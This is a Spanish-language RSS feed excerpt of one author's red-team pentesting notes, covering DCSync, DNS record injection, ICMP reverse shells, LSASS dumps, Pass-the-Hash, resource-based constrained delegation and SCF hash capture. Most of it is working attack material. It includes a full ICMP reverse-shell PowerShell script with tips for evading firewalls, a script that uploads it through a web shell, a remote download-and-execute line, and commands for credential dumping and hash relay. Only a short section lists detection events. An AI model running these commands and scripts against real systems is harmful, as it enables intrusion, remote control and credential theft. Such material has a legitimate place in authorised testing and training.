<br> Muchas veces la infraestructura de las organizaciones necesita más de un DC, para el AD. Para mantener la choerencia de un entorno con más de un DC , es necesario que los objetos de AD se repliquen a través de esos DC. La mayoria de las tareas relacionadas con la replicación se especifican en el Protocolo remoto de Serivico de replicación de directorios. <br>Por lo tanto, cuando veamos un usuario con los permisos GetChanges y GetChangesAll, ya que estos permisos le permiten a un usuario obtener información sobre los cambios realizados en Active Directory, incluidos los cambios en las credenciales de cuentas de usuarios. <br><br><br> Cuando un usuario posee los permisos de GetChanges y GetChangesAll se podrá realizar una replicación de dominio, de esta manera podemos usar herramientas como impacket-secretsdump para obtener los hashes de las contraseñas de los usuarios:<br>impacket-secretsdump {domain}/{user}@{target_ip}
Copy<br>Una vez ejecutado el comando anterior, obtendremos un output con todos los hashes NT de los usuarios del DC, en el mejor de los casos incluyendo el del usuario Administrador en donde su credencial no haya sido cambiada. Una vez teniendo el hash de la contraseña del usuario, podemos utlizar la herramienta impacket-psexec o impacket-wmiexec (Herramientas de línea de comandos que permite a los administradores de sistemas ejecutar comandos), para solicitar un consola interactiva.<br>impacket-psexec {domain}/{user}@{target_ip} --hashes :{hash}

psexec.py {domain}/{user}@{target_ip} --hashes :{hash} 

impacket-wmiexec {domain}/{user}@{target_ip} --hashes :{hash}

wmiexec.py {domain}/{user}@{target_ip} --hashes :{hash}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/dc-sync-attack.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/DC Sync Attack.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:49:47 GMT</pubDate></item><item><title><![CDATA[Injección de registros DNS]]></title><description><![CDATA[ 
 <br><br>La inyeccion de registros DNS (DNS Record Injection) es una técnica de ataque que aprovecha las vulnerabilidades en lso servidores DNS para modificar o agregar registros DNS de manera maliciosa. El objetivo prinvipal de esta técnica es alterar la resolución de nombres en un servidor DNS para redirigir el tráfico hacia destinos controlados por el atacante. <br>En el sistema DNS, los registros DNS contienen información clave para la resolución de nombres, como la asociación entre nombres de dominio y direcciones IP correspondientes. Al inyectar registros DNS maliciosos, un atacante puede alterar la información en el servidor DSN para manipular las respuestas que envían a los solicitantes legítimos. <br><br><br>Para la injeccion de un registro DNS podríamos hacer uso de herramientas como <a data-tooltip-position="top" aria-label="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py" rel="noopener nofollow" class="external-link" href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py" target="_blank">dnstool.py</a>, y a su vez en algunos casos, sobre todo en sistemas Windows, podríamos hacer uso de herramientas como el responder para envenenar al tráfico en intentar obtener credenciales como el hash NTLMv2 en caso de que se emitan solicitudes al registro DNS injectado con credenciales. <br>git clone https://github.com/dirkjanm/krbrelayx 
cd krbrelayx 

python3 dnstool.py -u '{domain}\{username}' -p '{password}' -r {dns_record_name} -a {action(add,etc)} -t A -d {record_ip} {target_ip}
Copy<br>De esta manera estaríamos intentando ingresar un nuevo registro dns con un nombre especificado que se resolverá a una ip especificada. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/dns-record-injection.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/DNS Record Injection.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:49:51 GMT</pubDate></item><item><title><![CDATA[ICMP]]></title><description><![CDATA[ 
 <br><br>El Internet Control Message Protocolo es parte del conjunto de protocolos IP. Es utilizado para enviar mensjes de error e información operativa indicando, por ejemplo, que un host no puede ser localizado o que un servicio se ha solicitao no está disponible.<br><br><br>La técnica ICMP Reverse Shell es utilizada para establecer una conexión inversa a través del protocolo ICMP desede una máquina comprometida a una máquina atacante. Esta técnica puede ser utilizada para evadir detecciones de seguridad y firewalls, ya que el tráfico ICMP a menudo se permite en muchas redes.<br>En este caso, podríamos usar el repositorio de <a data-tooltip-position="top" aria-label="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1" rel="noopener nofollow" class="external-link" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1" target="_blank">nishang</a> en donde se comparten scripts como PowerShellIcmp.ps1.<br>function Invoke-PowerShellIcmp
{        
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,

        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128

    )

    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptionsInvoke-PowerShellIcmp
    $PingOptions.DontFragment = $True

    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt; ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2&gt;&amp;1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0

            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '&gt; ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
Copy<br>De este script podríamos eliminar todos los comentarios e invocar el mismo al final, agregando la línea Invoke-PowerShellIcmp -IPAddress {our_ip}. Puede ser interesante de cara a evitar posibles black_lists o configuraciones de firewall cambiar el nombre a la función.<br>Una vez descargado el script, deberiamos ejecutar dos procesos específicos.<br>1. Configurar el sistema para que ignore todas las solicitudes de eco ICMP entrantes, lo que es equivalente a desactivar la respuesta a los pings. Esto puede utilizarse como una medida de seguridad para evitar que otros equipos realicen ping al sistema.<br>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
Copy<br>2. Descargar el script <a data-tooltip-position="top" aria-label="https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py" rel="noopener nofollow" class="external-link" href="https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py" target="_blank">icmpsh_m.py</a> y ejecutarlo con las indicaciones dadas. El mismo implementa el shell inverso a través del protocolo ICMP.<br>sudo python icmpsh_m.py {our_ip} {target_ip}
Copy<br>En caso de que no podamos subir a la máquina víctima el mismo con   IEX(New-Object Net.WebClient).downloadString('hgttp://{our_ip}/icmp_PowerShellIcmp.ps1') podríamos intentar aplicar el concepto de echo 'line to add' &gt; C:\Temp\file para línea por línea intentar cargar este script en un path determinado del sistema. <br>Para realizar esto es importante quitar todos los saltos de línea del script.<br>cat PowerShellIcmp.ps1 | sed '/^\s*$/d' | sponge PowerShellIcmp.ps1
# El \s es equivalente al espacio, por lo que se indica eliminar todo lo que empiece (^) con un espacio (\s) y acabe ($) con nada serán eliminadas (/d)
Copy<br>Una vez eliminados los espacios, hay que tener en cuenta que los carácteres especiales sean un problema, por lo que es buena idea empezar a pensar en base64, aunque PowerShell no lo interpretará de manera correcta debido a los caracteres y el formato de codificación de los archivos de script.<br>Por lo que habría que cambiar con la herramienta iconv el formato de codificación del archivo a UTF-16, ya que es la manera en la que powershell espera leerlo.<br>cat PowerShellIcmp.ps1 | iconv -t utf-16le | base64 -w 0; echo &gt; icmp_base64.ps1
Copy<br>De esta manera ahora tendríamos en poder un archivo con todo el script a cargar en el sistema víctima en el formato correcto y en base64.<br>Si tuvieramos que subir este archivo a la máquina victima y no tendríamos conectividad por TCP por Firewalls, sería importante tener en cuenta que no podríamos hacerlo de una única vez debido a que el comando curl o mismo el navegador tienen un limite, por lo que es buena idea emitir este por partes. Para realizar esto podemos hacer uso de la herramienta fold (Herramienta utilizada para dar formato y ajustar el ancho de las líneas de un archivo o texto). <br>fold icmp_base64.ps1 | sponge icmp_base64.ps1
Copy<br>Una vez que tengamos el contenido de manerar óptima, quedaría subir el archivo. Por lo que podríamos crearnos un script en bash o python.<br>#!/bin/bash

function ctrl_c(){
	echo -e "\n\n\t[!] Quiting...\n\n"
	tput cnorm; exit 1
}

declare -r url="http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx"

counter=0

echo; tput civis; for line in $(cat icmp.ps1.b64); do
	command="echo+$line+&gt;&gt;+C:\Temp\icmp_cmd.ps1"
	echo -ne "[+] Line $counter sended [$counter/87]\r"
	curl -s -X GET "$url?xcmd=$command" &amp;&gt;/dev/null
	let counter+=1
done; tput cnorm
Copy<br>Una vez subido el archivo, el problema al cual nos enfrentamos es que tenemos toda la fución de PowerShell en base64, por lo que habría que decodearlo. Para hacer esto podríamos hacer uso de herramientas como pwsh las cuales nos brindan un entorno de prueba de PowerShell.<br>powershell $functionb64 = Get-Content C:\Temp\icmp_cmd.ps1
# Guardar en la varibale functionb64 el contenido alojado en el archivo C:\Temp\icmp_cmd.ps1

powershell $decodeFunction = [System.Text.Encoding]::Unicode.getString([System.Convert]::FromBase64String($file64))
# Decodear de base64 el contenido de la función.

powershell $decodeFunction &gt; C:\Temp\final_icmp_cmd.ps1
# Guardar la función decodeada en un nuevo archivo C:\Temp\final_icmp_cmd.ps1

powershell $functionb64 = Get-Content C:\Temp\icmp_cmd.ps1; $decodeFunction = [System.Text.Encoding]::Unicode.getString([System.Convert]::FromBase64String($file64)); $decodeFunction &gt; C:\Temp\final_icmp_cmd.ps1
Copy<br>Como último, solo quedaría ejecutar el script final powershell C:\Temp\final_icmp_cmd.ps1 y recibir la conexión. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/icmp-reverse-shell-(powershell).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/ICMP Reverse Shell (PowerShell).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:49:55 GMT</pubDate></item><item><title><![CDATA[LSASS]]></title><description><![CDATA[ 
 <br><br>En windows lsass (Local Security Authority Subsystem Service) es un proceso crucial en el sistema operativo Windows. Es responsable de proporcionar diversos servicios de seguridad en el sistema, como la autenticación de usuarios, la administración de contraseñas, el manejo de políticas de seguridad y la autorización para el acceso a recursos y funciones del sistema. <br><br><br>Como vimos lsass es un proceso de interez de cara a auditorias, este contiene información muy sensible del sistema, hashes NT, passworrds, etc. Mayormente para tener acceso a estos datos es necesario realizar un volcado de memoria como ProcDump o MiniDumpWirteDump. Estas herramientas crear un archvo que contiene una instantánea de la memoria del proceso lsass. <br>Puede ser que nos encontremos escenarios raros en donde podamos llegar a ver archivos, comprimidos, carpetas con el nombre lsass lo cual automaticamente podría ser de un profundo interez ya que tal vez nos podrámos encontrar con archivos .dmp los cuales son archivos que contienen una instantánea del contenido de la memoria en el momento en el que se realizo el volcado. <br>De manera que esto puede ser de crucial interez para analizar de cara a una auditoria. <br>file {file.dmp}
# Con esto podemos ver el tipo de archivo .dmp al que nos enfrentamos, por ejemplo "Mini DMP"

pypykatz lsa {dump_type} {file.dmp}
# Podemos hacer uso de la herramienta pypykatz (Implementación de mimiktaz en python) para intentar listar el contenido del archivo DMP 
# Deberemos ingresar en {dump_file} una de las opciones que nos da la herramienta, por ejemplo si tuvieramos un archivo "Mini DMP" ingresariamos minidump 
# (Esto lo contempla la propia herramienta)
Copy<br>Una vez analizado el contenido, en el mejor de los casos nos podríamos encontrar con contraseñaes, hashes NT y montón de información sensible para poder comprometer el sistema o continuar por otras vías. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/lsass-dump-analysis.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/Lsass dump analysis.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 22 Aug 2024 20:52:42 GMT</pubDate></item><item><title><![CDATA[Pass The Hash (PTH)]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:blueteam" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blueteam</a> 
 <br><br>Pass The Hash es una técnica utilizada por los a atacantes en la que se aprovechan de un hash de contraseña robado en lugar de la contraseña en texto claro para aunteticarse en un sistema o red. En lugar de descifrar la contraseña real, los atacntes toman el hash de contraseña y lo utilizan como una credencial para accceder a sistemas y recursos sin conocer la contraseña real del usuario.<br>
<br>


<br>


<br>


<br><br><br>Por ejemplo, supongamos que logramos obtener el Hash NT del usuario Administrador, haciendo uso de la suite de impacket, con herramientas como imapcket-psexec<br># Una vez obtenido un Hash NT, ejemplo: 
"aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00"

# Ambas maneras son validas para llevar a cabo el Pass The Hash
impacket-psexec WORKGROUP/{Administrator}@{target_ip} -hashes :e0fb1fb85756c24235ff238cbe81fe00
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@{target_ip}
Copy<br>De esta manera nos podríamos autenticar como el usuario administrador en la máquina windows sin proporcionar contraseña ya que en lugar de esta proporcionamos el hash NTLM. <br>Otro ejemplo, es realizar una petición de un TGT, lo que nos permite continuar con el flujo normal de <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a> (Gráfico de autenticación: <a data-href="KERBEROS_AUTHETICATION_FLOW" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos_authetication_flow.html" class="internal-link" target="_self" rel="noopener nofollow">KERBEROS_AUTHETICATION_FLOW</a>), para obtener acceso a un servicio específico.<br>impacket-getTGT {dc}/{username} -hashes :{Hash_NT}

export KRB5CCNAME={path/to/username.ccache/downloaded}

impacket-psexec {dc}/{username}@{ip} -k -no-pass
Copy<br>Obteniendo así, una vez más, la <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>.<br><br><br>Por ejemplo, para realizar un Pass The Hash en caso de que tengamos privilegios y poder así intentar escalar los mismos, podríamos hacer uso de la herramienta impacket-secretsdump junto al archivo system y sam del sistema víctima. <br>La herramienta impacket-secretsdump es una herramienta utilizada para extraer y mostrar información relacionada con las credenciales y secretos almacenados en un sistema Windows. (Volcado de Hashes NTLM, extracción de credenciales almancenadas, extracción sobre cuentas de usuarios y grupos, mostrar información sobre servicios y volcado de información del registros de seguridad).<br>El archivo system es un archivo del registro de Windows que contiene información sobre la configuración y ajustes del sistema, así como detalles sobre los controladores de dispositivos y la configuración del hardware. <br>El archivo sam (Security Accounts Manager) es un archivo del registro de Windows, que contiene las cuentas de usuario y las claves de seguridad relacionadas con la autenticación en el sistema.<br><br>reg save HKLM\system system
reg save HKLM\sam sam 

# HKLM = HKEY_LOCAL_MACHINE (Una clave de raíz del Registro Windows)
Copy<br>Con la instrucción reg save estamos creando una copia de seguridad del contenido del archivo system y del archivo sam, para posteriormente descargarlo a nuestra máquina y así poder dumpear los hashes NT para realizar un Pass The Hash. <br><br>impacket-secretsdump -sam {sam_file} -system {system_file} LOCAL
Copy<br>Una vez ejecutado este comando, obtendremos una lista de todos los hashes NT de los usuarios registrados en la máquina victima. <br><br><br><br>Para entender como evitar un ataque de Pass The Hash primero es necesario entender que eventos se generan en una autenticación NTLM normal.<br><br>Ejemplo, como un usuario Administrador vamos a lanzar una consola para autenticar otro usuarios con privilegios Administrativos: <br># Lanzar una cmd como un usuario diferente
runas /user:{domain}\{username} cmd.exe

# Conectarse a un servidor de Microsoft SQL para generar una autenticación NTLM
slqcmd -S {host}
Copy<br>Una vez realizada las acciones del ejemplo dado, podemos ver que se registrar los siguientes logs.<br><br>
<br>4648 - Intento de logon con credenciales explicitas.
<br>4624 - Una cuenta fue logueada de manera exitosa. (Este log cuenta con un Logon Type: 2, lo que significa un "Logon interactivo")
<br>4672 - Privilegios especiales asignados al nuevo logon. (Esto por que en este ejemplo se utiliza una cuenta administrativa de manera inicial)
<br><br>
<br>4624 - Una cuenta fue logueada de manera exitosa. (Este log cuenta con un Logon Type: 3, lo que significa "Network Logon")
<br>4672 - Privilegios especiales asignados al nuevo logon.
<br><br>
<br>4768 - Se solicitó un ticket de autenticación de Kerberos (TGT).
<br>4769 - Se solicitó un ticket de serivicio (TGS).
<br>4776 - El equipo intento validar credenciales para una cuenta.
<br><br>Ejemplo, como un usuario Administrador vamos a lanzar una consola para aunticar a otro usuarios con privilegios Administrativos:<br># Se extraer el hash NT con mimikatz de un Usuario
sekurlsa::logonpasswords

# Se autentica usando Pass The Hash
sekurlsa::pth /user:{username} /ntlm:{ntlm} /domain:{domain}

# Contectarse a un servidor de Microsoft SQL
sqlcmd -S {host}
Copy<br>Una vez realizada las acciones del ejemplo dado, podemos ver que se registra los siguientes logs.<br><br>En este caso, los eventos son los mismos de una legítima autenticación (4648, 4624 y 4672) pero co algunas diferencias.<br>
<br>4624 - En este caso ahora cuenta con un Logon Type: 9, lo que significa 'NewCredential' a la vez que Logon Process = seclogo.
<br><br>En este caso son exactamente los mismos (4624 y 4672).<br><br>En este caso no veremos autenticación de Kerberos.<br><br>Como conclusión, para detectar este tipo de ataques se pueden hacer uso de la siguiente información obtenida:<br>
<br>1) Evento 4624 con Logon Type 9, Authentication Package = Negotiate y Logon Process = seclogo.
<br>2) Sysmon Event ID 10 (Proceso que indica acceso a LSASS).
]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/pass-the-hash.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/Pass The Hash.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 22 Aug 2024 20:50:52 GMT</pubDate></item><item><title><![CDATA[Resource-based Constraint Delegation]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:KERBEROS" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#KERBEROS</a> 
 <br>El Resource-based Constraint Delegation establece en el objeto quién puede suplantar a cualquier usuario en su contra.<br>En este caso, el objeto restringido tendrá un atributo llamado msDS-AllowedToActOnBehalfOfOtherIdentity con el nombre del usuario que puede suplantar a cualquier otro usuario en su contra.<br>Otra diferencia importante de esta Delegación restringida a las otras delegaciones es que cualquier usuario con permisos de escritura sobre una cuenta de máquina (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) puede configurar el msDS-AllowedToActOnBehalfOfOtherIdentity (En las otras formas de Delegación necesitaba administrador de dominio privs).<br>
<br>El atacante compromete una cuenta que tiene un SPN o crea uno ("Servicio A"). Tenga en cuenta que cualquier usuario administrador sin ningún otro privilegio especial puede crear hasta 10 objetos de equipo (MachineAccountQuota) y establecerles un SPN. Entonces, el atacante puede simplemente crear un objeto de computadora y establecer un SPN.
<br>El atacante abusa de su privilegio de ESCRITURA sobre la computadora víctima (ServiceB) para configurar la delegación restringida basada en recursos para permitir que ServiceA suplante a cualquier usuario contra esa computadora víctima (ServiceB).
<br>El atacante usa Rubeus (U otras maneras de explotar y realizar el ataque) para realizar un ataque S4U completo (S4U2Self y S4U2Proxy) del Servicio A al Servicio B para un usuario con acceso privilegiado al Servicio B.

<br>S4U2Self (de la cuenta SPN comprometida/creada): Solicite un TGS de administrador para mí (no reenviable).
<br>S4U2Proxy: use el TGS no reenviable del paso anterior para solicitar un TGS del administrador al host de la víctima.
<br>Incluso si está utilizando un TGS no reenviable, ya que está explotando la delegación restringida basada en recursos, funcionará.


<br>El atacante puede pasar el ticket y hacerse pasar por el usuario para obtener acceso al ServiceB de la víctima.
<br><br>Así como se puede explotar con Rubeus, existen otras maneras, desde el script rbcd.py encontrado en github <a rel="noopener nofollow" class="external-link" href="https://github.com/tothi/rbcd-attack" target="_blank">https://github.com/tothi/rbcd-attack</a>, así como tambien usando las herramientas de impacket:<br> Lo primero que deberiamos hacer es crear el Computer Objetc, para esto usaremos powermad (Se recomienda tambien usar powerview)<br>
<br>Powermad: (wget <a rel="noopener nofollow" class="external-link" href="https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1" target="_blank">https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1</a>) 
<br>Powerview: (wget <a rel="noopener nofollow" class="external-link" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" target="_blank">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a>)
<br>Ambos deberian transferirise a la maquina victima windows que tenemos pwneada, una vez en ella:<br>Import-Module .\Powermad.ps1
Import-Module .\PowerView.ps1
New-MachineAccount -MachineAccount {evilPC_name} -Password $(ConvertTo-SecureString '{evilPC_passwd}' -AsPlainText -Force) -Verbose
Copy<br>Una vez creada la maquina, podriamos (haciendo uso de powerview) ver si esta se creo correctamente: <br>Get-DomainComputer {evilPC_name}
Copy<br>Luego, haciendo uso de powerview declaramos algunas variables para realizar el ataque: <br>$targetComputer = {taget_Computer}

$ComputerSid = Get-DomainComputer {evilPC_name} -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Adicionalmente, una vez más, haciendo uso de powerview podriamos corroborar que todo haya salido ok, ejecutando: 

Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

# Lo que deberia arrojar: 
# msds-allowedtoactonbehalfofotheridentity

# ----------------------------------------

# {1, 0, 4, 128...}
Copy<br> De esta manera habriamos realizado todo, solo quedaria solicitar un TGT a <a href="https://dobliuw.com?query=tag:KERBEROS" class="tag" target="_blank" rel="noopener nofollow">#KERBEROS</a> para suplantar la identidad del usuario que deseemos. En nuestra maquina atacante con linux: <br>impacket-getST -spn cifs/{dc} -impersonate {user_to_supplant} -dc-ip {dc_ip} {dc}/{evilPC_name}$:{evilPC_password}
Copy<br>De esta manera habriamos solicitado y conseguido el TGT para el usuario que desearamos, por lo que simplemente quedaria exportart la variable global KRB5CCNAME, y utilizar psexec para autenticarnos como el usuario suplantado: <br>export KRB5CCNAME=$(pwd)/{user_to_supplant}.ccahe

impacket-psexec -k {dc}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/resource-based-constraint-delegation.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/Resource-based Constraint Delegation.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:52:36 GMT</pubDate></item><item><title><![CDATA[SCF File Attacks]]></title><description><![CDATA[ 
 <br><br>En el contexto de Windows, un archvio SCF (Shell Command File) es un tipo de archivo de script que contiene comandos que peuden ser ejecutados por el Explorador de Windows u otros componentes del sistema operativo. Estos archivos se utilizan para automatizar tareas relacionadas con el sistema, configuraciones y operaciones en el entorno de Windows. <br><br><br>No es nuevo que los SCF (Shell Command FIle) pueden ser usados para distintas operaciones. Una de estas operaciones puede permitirle al SCF acceder a un path de un servicio SMB permitiendo así a los atacantes capturar el hash NTLMv2.<br><br>[Shell]
Command=2
IconFile=\\{our_smb_server_ip}\{folder}\test.ico
[TaskBar]
Command=ToggleDesktop
Copy<br>Una vez creado el archivo, al momento de ser ejecutado intentará cargar un icono desde el recurso indicado, por lo que desde nuestra máquina de atacante podríamos crear un servidor SMB o estar en escucha con el responder con el fin de capturar el hash NTLMv2.<br><br># Crear un servidor smb para recibir la petición a la hora de ejecutar el archivo
impacket-smbserver -smb2support smbFolder $(pwd)
Copy<br><br>responder -w --lm -v -I {interfaz}
Copy<br>Una vez capturado el hash, solo queda intentar crackearlo de manera ofline con herramientas como john.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/scf-file-attacks-(shell-command-file).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/SCF File Attacks - (Shell Command File).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:46:51 GMT</pubDate></item><item><title><![CDATA[gssapi-with-mic]]></title><description><![CDATA[ 
 <br><br> La autenticación GSSAPI es usada por kerberos, la cual lee de un archivo local del sistema para autenticarse de manera exitosa. <br><br><br>Puede darse el caso en el cual al conectarnos a travez de SSH, si usamos la flag -v (O ya sea como mensaje de error) podríamos ver esto de gssapi-with-mic, lo cual al investigar veríamos que se trata de la configuración de kerberos, entendiendo así que ssh esta usando este metodo de autenticación antes que el tradicional, dandonos la ventaja como atacantes de poder abusar de esto. <br>Para esto deberíamos contar con credenciales válidas de kerberos. <br>sudo apt install krb5-user
sudo dpkg-reconifugre krb5-config
# En este punto indicariamos el dominio de kerberos junto a la ip 

sudo nano /etc/krb5.conf
                               
# [libdefaults]
#        default_realm = {domain}
# 
# [realms]
#       {domain} = {
#                kdc = {kdc}
#        }
#
# [domain_realm]
#        .{domain} = {domain}
#        {domain} = {domain}
Copy<br>De esta manera, una vez configurado, con la herramienta klist podríamos ver que no tenemos nigun ticket almacenado, por lo que haciendo uso de la herramienta kinit podríamos indicar un usuario: <br>kinit {username}
Copy<br>El cual se resolvera a {username}@{domain} y en caso de ser este válido, nos pedirá la contraseña lo cual al ingresarla, en caso de también ser válida, verémos que con klist se nos crea en una ruta un ticket. <br>De manera que ahora al volver a autenticarnos con ssh, siendo la conexión ssapi-with-mic la primera en probarse, esta leera del archivo creado por kinit y nos otorgara acceso al sistema sin proporcionar contraseña. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/ssh-via-kerberos-(gssapi-with-mic).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/SSH via Kerberos - (gssapi-with-mic).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:36:11 GMT</pubDate></item><item><title><![CDATA[APIs abuse]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
